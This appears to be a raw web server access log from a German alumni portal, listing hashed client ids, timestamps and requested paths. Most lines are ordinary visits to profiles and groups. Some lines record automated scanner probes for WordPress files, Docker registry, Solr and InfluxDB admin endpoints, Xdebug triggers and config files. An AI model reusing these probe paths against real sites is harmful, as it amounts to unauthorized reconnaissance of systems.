7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-18 13:03:22;;/personen/alumni/details/jana-zenker;GET;200
bab7eed5d1151d97aba18179dccc4e0462e47bfa7bbc04b3b5284ecc0cff8121;2025-11-18 13:05:55;;/personen/alumni/details/sophia-gawron;GET;200
e783db1f4a697614a8c01aa9ece12c5018dc3a280e539620a754706eefb9705e;2025-11-18 13:13:29;;/xmlrpc.php;GET;404
c418584ee86153c26cd1cfa5ed8198e8591611f981f38089293b3c0b2f4b3053;2025-11-18 13:23:34;;/gruppen/hobby/robotik;GET;302
57ebfd77d82a3dff77af256e28e7db614e4e5bed10023c944b24d9585a957c24;2025-11-18 13:38:46;;/personen;GET;200
be3f01b374de08e29468b5217809f4d6f5f4b3197ce7fec03536c94d4ea25ad4;2025-11-18 13:39:30;;/actuator/health;GET;404
c7b746455a8d7e92c9b862454c802ddb01108e08460ee02218bc747ce631b1b1;2025-11-18 13:48:49;;/gruppen/hobby/journalismus;GET;302
a0f4d2d3869c765a0ec69a8ba65f522de59824a47ad8dad613b39128bf494597;2025-11-18 13:48:50;;/gruppen;GET;200
d23c5acbcd7850a17e7aca7ce72680a70c5ed69122fd77ba8fa935825edb8f7b;2025-11-18 13:58:28;;/;GET;200
8fbbccc724eb7ce250a1040de5775ca6c7076910bd95aff91c5984b161493d6f;2025-11-18 13:58:43;;/profile;GET;302
07a047edb847c12d49af296a663c00888d7b86db5cb242c9bbbc05db7f1ffa1b;2025-11-18 13:58:58;;/themen/2;GET;200
3b1f6da3371acbacd56c6b45f023c108e1b0bfc4b20a0a133b97f9f4ff29235a;2025-11-18 13:59:14;;/about/allgemein;GET;200
a55759be94fecfa0de965356635275e7f183edc2e360700330db77a8b9d45c01;2025-11-18 13:59:29;;/personen/all/2;GET;200
f9bb820701a869040053167869fea992098902484c9d4e9a9c145e0dd2e9881a;2025-11-18 13:59:31;;/gruppen/hobby/schreinern-und-bauen;GET;302
1a931910562e780aff930c9dc342a9b8c9199818e59deda01dbfdda3be52d57e;2025-11-18 13:59:45;;/personen/all/5;GET;200
9c5801bfd7f9707abe0b64ae628fc0963304efb92c6ad8551263129f6286f65f;2025-11-18 14:00:00;;/gruppen/hobby/reisen;GET;302
86bb133cff80a97c1bfa2ca14b8e95a27b95db49235912dc95e5dde77ddcf9ed;2025-11-18 14:00:15;;/gruppen/hobby/wandern;GET;302
6c9743fecfe81029431181f85a5fe57616c41ddd2cd82b01fed2dd125d0541e6;2025-11-18 14:00:32;;/gruppen/hobby/fitness;GET;302
07a047edb847c12d49af296a663c00888d7b86db5cb242c9bbbc05db7f1ffa1b;2025-11-18 14:00:47;;/gruppen/hobby/chor;GET;302
98894d44f3a2db2082c8196b9c2003e9652546d7856abbf7915dc87471520dfe;2025-11-18 14:01:02;;/gruppen/hobby/biologie;GET;302
aab8821bf9b9794f106ae6c261e3e639d4f23439374480d47c551cb02da40c47;2025-11-18 14:01:17;;/gruppen/hobby/statistik;GET;302
20017038e8dde17c3d74d624afaa82a001dd1a410fbd800bd4a1db34e043ef39;2025-11-18 14:01:32;;/gruppen/hobby/chemie;GET;302
094c2e7985d9ee289e9d07a3ebbae43d923ed8c2d65995d338d31c5c8418551e;2025-11-18 14:01:47;;/gruppen/hobby/geometrie;GET;302
c2f8bfb9b47e2c21b4de83c2f50aeb892861375d36ca35cbc581d4ce6d5f333c;2025-11-18 14:02:03;;/gruppen/hobby/geschichte;GET;302
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:05;;/;GET;200
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:07;;//wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:08;;//xmlrpc.php?rsd;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:09;;/;GET;200
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:10;;//blog/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:12;;//web/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:14;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:15;;//website/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:16;;//wp/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:17;;//news/wp-includes/wlwmanifest.xml;GET;404
d23c5acbcd7850a17e7aca7ce72680a70c5ed69122fd77ba8fa935825edb8f7b;2025-11-18 14:02:18;;/gruppen/hobby/astronomie;GET;302
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:19;;//2020/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:20;;//2019/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:21;;//shop/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:23;;//wp1/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:25;;//test/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:27;;//wp2/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:28;;//site/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:30;;//cms/wp-includes/wlwmanifest.xml;GET;404
3cd153cee55e43637f5e3266173c74e343143402596f70d9a0f1f31a743146ce;2025-11-18 14:02:31;;//sito/wp-includes/wlwmanifest.xml;GET;404
a56e5bdefcc1ddfddb65cccd19ffeca97b773db8e1f61e41074d051c5f42c28b;2025-11-18 14:02:33;;/gruppen/hobby/gesang;GET;302
20017038e8dde17c3d74d624afaa82a001dd1a410fbd800bd4a1db34e043ef39;2025-11-18 14:02:48;;/gruppen/hobby/robotik;GET;302
87c69c159a4e65e76345687ba4e71615cacbbd856a62652a680477529e3f0c7e;2025-11-18 14:03:03;;/gruppen/hobby/finanzbildung;GET;302
8c8b06a4086c021282cd2ba9a9962faf16abec264bbecd736ce5d0cdccdf6947;2025-11-18 14:03:18;;/gruppen/hobby/tanzen;GET;302
3074db19bb60d525fb7a6aba195add2dd51e88b315cdf48c3176d85abd2bd337;2025-11-18 14:03:34;;/gruppen/hobby/gartnern;GET;302
8e57f343159573bba7dd999aa8e61ba577beca007c59cd258a4150bdc4279d3c;2025-11-18 14:03:49;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
8c8b06a4086c021282cd2ba9a9962faf16abec264bbecd736ce5d0cdccdf6947;2025-11-18 14:04:04;;/gruppen/hobby/debattieren;GET;302
5186cee312665497ccb498667a7596feeff3e5902cb2244224d0db51c2d2da5e;2025-11-18 14:04:19;;/gruppen/hobby/abschlussfest;GET;302
92d4668288bd9fc83e518333d95ec4dc5e280e43355f6d1d36ee3f9d05d62f48;2025-11-18 14:04:34;;/gruppen/hobby/skulptur;GET;302
62e36bca544272b98302e4a5f7a41db08ebbc331519fe202de792c22b6f82e4f;2025-11-18 14:04:49;;/gruppen/interesse/entrepreneurship;GET;200
11b9c12ee2382a7db1bc816b512f200420de4f836530fddcb2104ad6be11ac7c;2025-11-18 14:04:52;/;/;GET;200
87d7b6ec6019de2fd240ae2557866749d6762f138ab13d61e93768c58851095a;2025-11-18 14:07:05;;/docs/img/tbl-pupil.png;GET;404
068f61e6d1d47dfcc368cfd95844dd52feac6337502ff4072de7e8213a1b5bc7;2025-11-18 14:10:26;;/aktuelles/stellenangebote;GET;200
2e24c8af45ad1366ce995ec42d562a53484d743ae8e8bae6400ce26fdf785df1;2025-11-18 14:16:39;;/;GET;200
7b90e540c0a4a1c2fd705d2b90acf4ae4231cc1e7d32a858d8e8148023ba213b;2025-11-18 14:26:36;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
60b274e07d211a20a8c229e14eeeae046260d20733c91f2d583ff68d4c2b778a;2025-11-18 14:38:12;;/;GET;200
36431a4737b4580c2a3c2febcd0b43398d95def0aff3d2abe226ef10dbca828f;2025-11-18 14:38:17;;/login;GET;200
332093e1226e33c7a31ecfd2a211e4a44a065e8eb2294bb9a1afc2eeccad2e77;2025-11-18 14:39:54;;/;GET;200
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:26;;/;GET;200
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:27;;//wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:27;;//xmlrpc.php?rsd;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:29;;/;GET;200
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:31;;//blog/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:33;;//web/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:35;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:36;;//website/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:37;;//wp/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:39;;//news/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:40;;//2020/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:41;;//2019/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:42;;//shop/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:43;;//wp1/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:44;;//test/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:44;;//wp2/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:45;;//site/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:46;;//cms/wp-includes/wlwmanifest.xml;GET;404
567656ff91803fbcc143dbca872163c214b9f56156e2760929b64035e14ad35e;2025-11-18 14:51:47;;//sito/wp-includes/wlwmanifest.xml;GET;404
d5ff254eb3eaa8e70e45fe8c2c50382e6f39d130f8d628ee24fcf0ac78024e2c;2025-11-18 14:51:49;;/sitemap.xml;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-18 14:52:36;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/HB0002;GET;200
15b572aa86215eabf3071f39fa5a2a99309e8cbd18a1b33cb3990239c0e35430;2025-11-18 14:54:40;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
346f1503a574eac64ad70d710d500381158c15c5097a3147a8e7a2bcb8558348;2025-11-18 14:55:34;;/;GET;200
dafea624eb7fbf2a193a10ada75cb9c945fc0d2a6c80716a4c079a11df965bf6;2025-11-18 15:00:05;;/;GET;200
404b8ae57482a42363d372ede91ae2ba05dc1bc78e67e3003d0ccd4ad328ddf0;2025-11-18 15:07:17;;/;GET;200
553dcd9ee7e6d442399e434b02c52ba7c03c74347143dd490440f931d2684ad4;2025-11-18 15:13:51;;/;GET;200
b4b07e230f83db42bddbd191a33c38a3fae0deba1ddd3ff1633c75cc29b5d9de;2025-11-18 15:14:04;;/;GET;200
1cc07f48532d610b69cc7988b26cc51417a729879f95be6c9c56d4f8ddfe9870;2025-11-18 15:31:57;;/gruppen/hobby/fremdsprachen;GET;302
35a08e7bde4241017b3bf055c81a55fdf5b7383120d051a11abb6855dbfa7334;2025-11-18 15:39:26;/v2/_catalog;/v2/_catalog;GET;404
27e72bd2764cd8290f3e0bb16f39714572f7f6f79e9baf85037a4c63881b9bd9;2025-11-18 15:39:26;/query?q=SHOW+DIAGNOSTICS;/query?q=SHOW+DIAGNOSTICS;GET;404
d06dcbe32f46b5c2b9be6b90769de013041809c39a96bcf5d8df20f69f6936c0;2025-11-18 15:39:26;/solr/admin/info/system;/solr/admin/info/system;GET;404
35a08e7bde4241017b3bf055c81a55fdf5b7383120d051a11abb6855dbfa7334;2025-11-18 15:39:26;;/;GET;200
d06dcbe32f46b5c2b9be6b90769de013041809c39a96bcf5d8df20f69f6936c0;2025-11-18 15:39:26;/solr/admin/cores?action=STATUS&wt=json;/solr/admin/cores?action=STATUS&wt=json;GET;404
e591e592255e08f07957a1fbe00e972fd2ae44162980e313bfea1d966fb4a2ff;2025-11-18 15:39:26;/;/;GET;200
74d56dbcd52e2686b8998928d9a615634b6eb2a7b380b5731b30aa1bf54a2df4;2025-11-18 15:39:33;;/plugins/content/apismtp/apismtp.php?test=hello;GET;404
dd1f5e29a1242c105706247400462104cf01119a8920b336bb41294610a958f2;2025-11-18 15:44:14;/;/;GET;200
6a26251cb5a8693f6ef808fe5e437239f654ec5721571e31fe63573f906dd296;2025-11-18 15:44:14;;/;GET;200
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:31;;/;GET;200
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:33;;//wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:33;;//xmlrpc.php?rsd;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:33;;/;GET;200
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:34;;//blog/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:34;;//web/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:35;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:35;;//website/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:35;;//wp/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:36;;//news/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:36;;//2020/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:37;;//2019/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:37;;//shop/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:37;;//wp1/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:38;;//test/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:38;;//wp2/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:38;;//site/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:39;;//cms/wp-includes/wlwmanifest.xml;GET;404
05ea70d5e957f56ad4877029216fc528e958fff97a221105d68503a0bebdbbb6;2025-11-18 15:51:39;;//sito/wp-includes/wlwmanifest.xml;GET;404
f4dff3af1425db4d0a97878e9354c9abb4690433087e2f70c3998ead9d1c0098;2025-11-18 15:54:36;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-18 16:03:27;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/67945;GET;200
40f9a08349af7fc3ca585055213570da3a0a0b0131e555c9869796fe72b12989;2025-11-18 16:05:59;/;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-18 16:23:04;/personen/alumni/details/sebastian-langhorst;/personen/alumni/details/sebastian-langhorst;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-18 16:24:23;/personen/all/5;/personen/alumni/details/jana-zenker;GET;200
3ba94cbd63680ddb1b3fac8cc5e1bc0ddce5fcffd8eabb9d4c806459157d28b5;2025-11-18 16:25:45;;/personen/alumni/details/sophia-gawron;GET;200
7a9312b0d6adf89c81cd068e32139ada047406a634abdac3b123aa07328af76c;2025-11-18 16:30:38;;/gruppen/hobby/geschichte;GET;302
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:31;;/;GET;200
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:33;;//wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:34;;//xmlrpc.php?rsd;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:37;;/;GET;200
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:38;;//blog/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:39;;//web/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:41;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:41;;//website/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:43;;//wp/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:44;;//news/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:45;;//2020/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:45;;//2019/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:46;;//shop/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:47;;//wp1/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:49;;//test/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:50;;//wp2/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:51;;//site/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:52;;//cms/wp-includes/wlwmanifest.xml;GET;404
e4f0a561c0049d9d4eb1c51c3843e25da141b95539ac5f263c820e53d41a44ed;2025-11-18 16:37:53;;//sito/wp-includes/wlwmanifest.xml;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-18 16:40:52;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/59013;GET;200
94d0b5e5812a36bed998f0115936d74241882d3d868819cf0c223498d4d4961c;2025-11-18 16:58:03;;/;GET;200
5e1bb3b150d895a1263d17728a9aa1ed56f3ab5568cd2fe97bf546ae84d11888;2025-11-18 16:58:49;;/;GET;200
b1bbc950dbee7b355c41306928c4fc527defc4dfbcfa73d1eef0d9231e36c8b0;2025-11-18 17:07:30;;/aktuelles/stellenangebote;GET;200
ba9d1265cb9daf958bb49434b21c499b1cb2c2a748b558a69ef3f5c6392683f4;2025-11-18 17:12:48;;/;GET;200
f7fc043231f14a1e4f478bfc1b603e77b30d93b188cfe4e2de1bffa270ef8cb4;2025-11-18 17:36:12;;/;GET;200
40832cd36de64fcccba4ebc88e589f1b456e835c58fe9b647ac28e51b3bd163e;2025-11-18 17:49:39;;/personen/alumni/details/sophia-gawron;GET;200
50f9c45231d178d8afe8e3fabf5340c389f686d3f631208d8d348c3017c6b42d;2025-11-18 17:58:41;;/;GET;200
e18a5d0426c8581b28ff2d243a07dee29a58c87b969996391006b48d87b223a8;2025-11-18 18:05:08;;/;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-18 18:10:27;;/;GET;200
be5931cbddcadc4d03d4c047b5c61de457c479348d88b9208be9fe20a1abf728;2025-11-18 18:21:27;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-18 18:37:34;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
8b486169b11d9ae962e4a4a4e29ea90180054a5c217bc9c1a1b89a7383dfbc8d;2025-11-18 18:41:07;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
0f4fe32edc110a43177fc3522f26c2a3f3d2db4fa740fdde873d0e51f26b372d;2025-11-18 18:44:42;;/;GET;200
b6ec75bbb2858e5c9765836955f136fecedef6d40c7155340bd47636e77c36b9;2025-11-18 18:50:30;;/personen/alumni/schule/9002;GET;200
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:19;/SNfU;/SNfU;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:20;/TPiP;/TPiP;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:22;/aab8;/aab8;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:29;/jquery-3.3.1.slim.min.js;/jquery-3.3.1.slim.min.js;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:30;/aab9;/aab9;GET;404
686403b40c5c4cea653da0a57a45d412d71fc227992c834599a18221907f0504;2025-11-18 18:54:35;/jquery-3.3.2.slim.min.js;/jquery-3.3.2.slim.min.js;GET;404
1e8f7541d0ef654fa631946bed5d3db830bc0aa3d6472927e9940f2c14de56a2;2025-11-18 19:13:24;;/;GET;200
3775543c26c8f7bd595c78eba19347aa0c0323a7ea4a4a1f47cb2b3b1c601088;2025-11-18 19:15:59;;/vkey/;GET;404
c91b48ab9f08343c0a73f755283f7843c14a63ecf1e5cce124980cd33cd98a48;2025-11-18 19:19:37;/vkey/;/vkey/;GET;404
0a6b2dfa34d7ca093df84253b874b6b2eb8a57581427868418533cf618602d05;2025-11-18 19:19:44;;/sitemap.xml.gz;GET;404
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-18 19:19:54;;/;GET;200
7c622f97fe3be827ed4c02a84f249302514eaac4e68d86ed58f28c0e8758754e;2025-11-18 19:21:49;;/;GET;200
16a4ca87dd31e0f2abab0b473d0ce1905f4a8ce1150fb0fed01584c36aff861b;2025-11-18 19:23:01;;/;GET;200
413a6f12113a0414efd5202d136fe34229a4204561998575d2f97cd08020851d;2025-11-18 19:33:07;;/admin/config.php;GET;404
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:44:18;;/;GET;200
5a9d31a106716492a71546cd6e89174e3d84f4e5f39577f0527a41276df2350b;2025-11-18 19:45:47;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:47:04;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:52:54;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:52:54;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:54:18;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:55:12;;/;GET;200
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:01;;//wp-includes/ID3/license.txt;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:03;;//feed/;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:03;;//xmlrpc.php?rsd;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:04;;//blog/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:04;;//web/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:05;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:05;;//wp/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:06;;//2020/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:06;;//2019/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:06;;//2021/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:07;;//shop/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:07;;//wp1/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:08;;//test/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:08;;//site/wp-includes/wlwmanifest.xml;GET;404
a95286b286da2224ba33820807dbdb2fed77d552d63d09a3145ec6f28b21e277;2025-11-18 19:56:08;;//cms/wp-includes/wlwmanifest.xml;GET;404
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:59:23;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:59:48;;/;GET;200
fe90e85604d551a01f2c3f334ac855b37cd1426146cdcec8d47b78bb0562d5f8;2025-11-18 19:59:48;;/;GET;200
